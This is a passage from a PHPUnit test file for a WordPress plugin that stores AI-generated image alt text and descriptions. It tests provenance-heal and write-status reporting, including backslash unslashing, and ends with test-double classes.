        $this->assertIsArray($prov);
        // Provenance draft is also stored unslashed.
        $this->assertSame($expectedStored, $prov['alt_text_draft'] ?? null);
    }

    /**
     * F-04: provenance-heal fall-through must not author long description when
     * force=false even if post_content is empty and acx_alt_style is
     * alt_plus_description. Provenance-only recovery is not a first write.
     */
    public function testProvenanceHealDoesNotWriteLongDescriptionWithoutForce(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        // Empty post_content — the defect path would fill it without force.
        $GLOBALS['__ac_posts'][42]->post_content = '';

        $long = 'Long body that must not land without force.';
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42, $long)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42, false));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('provenance_healed', $write['status'] ?? null);
        $this->assertArrayNotHasKey('description_write', $write);
        $this->assertSame('', $GLOBALS['__ac_posts'][42]->post_content);
        $this->assertNotSame($long, $GLOBALS['__ac_posts'][42]->post_content);
        $this->assertIsArray(get_post_meta(42, '_acx_description_provenance', true));
    }

    /**
     * F-06: heal read-back must fail when update_post_meta returns non-false but
     * storage does not hold the expected envelope (write accepted, value altered).
     * Existing heal-failure tests only exercise the false-return fail hook.
     */
    public function testHealReadBackFailsWhenStoredProvenanceDiffersAfterNonFalseWrite(): void
    {
        $this->plantWritableAttachment(42);
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'generated_at'           => '2026-01-01T00:00:00+00:00',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));
        // Simulate: write returns non-false (accepted) but drops/alters the value.
        $GLOBALS['__ac_update_post_meta_mutate'][42]['_acx_description_provenance'] = array(
            'adapter' => 'MUTATED_NOT_HEALED',
        );

        $result = $this->controller->describe_media($this->writeRequest(42, true));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('partial', $write['status'] ?? null);
        $this->assertSame('provenance_write_failed', $write['reason'] ?? null);
        $this->assertNotSame('forced_overwrite', $write['status'] ?? null);
    }

    /**
     * F-13: non-force path when alt equals draft, identity matches, and the
     * draft-key heal write fails must report partial + provenance_write_failed
     * (not silent skipped_existing_alt).
     */
    public function testNonForceHealFailureReportsPartialNotSkipped(): void
    {
        $this->plantWritableAttachment(42);
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'generated_at'           => '2026-01-01T00:00:00+00:00',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));
        $GLOBALS['__ac_update_post_meta_fail'][42]['_acx_description_provenance'] = true;

        $result = $this->controller->describe_media($this->writeRequest(42, false));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('partial', $write['status'] ?? null);
        $this->assertSame('provenance_write_failed', $write['reason'] ?? null);
        $this->assertNotSame('skipped_existing_alt', $write['status'] ?? null);
        $stored = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($stored);
        $this->assertArrayNotHasKey('alt_text_draft', $stored);
    }

    /**
     * F-14: non-force identity-match heal must actually persist alt_text_draft
     * into storage. Asserting status alone cannot catch a no-op heal.
     */
    public function testNonForceHealSuccessPersistsAltTextDraftInProvenance(): void
    {
        $this->plantWritableAttachment(42);
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'generated_at'           => '2026-01-01T00:00:00+00:00',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42, false));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        // Identity-complete heal reports skipped_existing_alt (not gap restamp).
        $this->assertSame(
            'skipped_existing_alt',
            $result->get_data()['alt_text_write']['status'] ?? null
        );
        $healed = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($healed);
        $this->assertSame('A photo.', $healed['alt_text_draft'] ?? null);
        $this->assertSame('2026-01-01T00:00:00+00:00', $healed['generated_at'] ?? null);
    }

    /**
     * F-15: long-description read-back must unslash. A backslash-bearing body
     * that lands correctly must report written, not failed (ASCII is a fixed
     * point under wp_unslash and cannot pin this axis).
     */
    public function testLongDescriptionBackslashBearingWriteSucceeds(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $long           = 'Diagram of the C:\\Users share layout.';
        $expectedStored = wp_unslash($long);
        $this->assertNotSame($long, $expectedStored, 'precondition: unslash must change the bytes');

        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42, $long)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('written', $write['status'] ?? null);
        $this->assertSame('written', $write['description_write'] ?? null);
        $this->assertSame($expectedStored, $GLOBALS['__ac_posts'][42]->post_content);
    }

    /**
     * F-16: heal envelope read-back must unslash. Backslash-bearing draft on a
     * force no-op heal must land and report success (ASCII cannot pin unslash).
     */
    public function testForceNoOpHealBackslashBearingDraftSucceeds(): void
    {
        $this->plantWritableAttachment(42);
        $draft          = 'C:\\Users\\photo';
        $expectedStored = wp_unslash($draft);
        $this->assertNotSame($draft, $expectedStored, 'precondition: unslash must change the bytes');

        $this->setPostMeta(42, '_wp_attachment_image_alt', $expectedStored);
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'generated_at'           => '2026-01-01T00:00:00+00:00',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);

        $body                   = $this->validBackendBody(42);
        $body['alt_text_draft'] = $draft;
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42, true));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('forced_overwrite', $result->get_data()['alt_text_write']['status'] ?? null);
        $healed = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($healed);
        $this->assertSame($expectedStored, $healed['alt_text_draft'] ?? null);
        $this->assertSame('2026-01-01T00:00:00+00:00', $healed['generated_at'] ?? null);
    }
}

/**
 * Test double: a post object whose post_content assignment path stores a
 * different value than the one written. Emulates wp_insert_post_data (or KSES)
 * rewriting the body while wp_update_post still returns the post ID.
 *
 * Uses magic properties so the harness stub's
 * `$post->{$key} = $value` assignment goes through __set.
 */
final class DescribeMediaFilteredPostContent
{
    public const FILTERED_BODY = 'FILTERED_BY_INSERT_POST_DATA';

    /** @var array<string,mixed> */
    private array $props;

    public function __construct(int $id, string $initialContent = '')
    {
        $this->props = array(
            'ID'           => $id,
            'post_content' => $initialContent,
            'post_title'   => "Photo {$id}",
            'post_excerpt' => 'A caption.',
            'post_type'    => 'attachment',
        );
    }

    public function __isset(string $name): bool
    {
        return array_key_exists($name, $this->props);
    }

    public function __get(string $name): mixed
    {
        return $this->props[$name] ?? null;
    }

    public function __set(string $name, mixed $value): void
    {
        if ('post_content' === $name) {
            // Core-faithful observable: filters may replace the submitted body.
            $this->props['post_content'] = self::FILTERED_BODY;
            return;
        }
        $this->props[$name] = $value;
    }
}

final class DescribeMediaServiceTestHost implements DescribeHostInterface
{
    /**
     * @var array<string,mixed>
     */
    public array $lastBody = array();

    /**
     * @param array<string,mixed> $backendBody
     */
    public function __construct(private string $tenantId, private array $backendBody) {}

    public function get_tenant_id(): string
    {
        return $this->tenantId;
    }

    public function proxy_recognition_request(
        string $method,
        string $path,
        array $body = array(),
        array $query = array(),
        string $request_class = 'auto',
        string $body_kind = 'json',
        ?int $max_body_bytes = null
    ): WP_REST_Response|WP_Error {
        $this->lastBody = $body;
        return new WP_REST_Response($this->backendBody, 200);
    }

    public function is_proxy_unavailable(WP_REST_Response|WP_Error $response): bool
    {
        return false;
    }
}

final class DescribeMediaServiceTestIdentityRepository extends NullIdentityMembersRepository
{
    /**
     * @param array<int,array<string,mixed>> $rows
     */
    public function __construct(private array $rows) {}

    public function list_for_media_ids(string $tenant_id, array $media_ids): array
    {
        return $this->rows;
    }
}
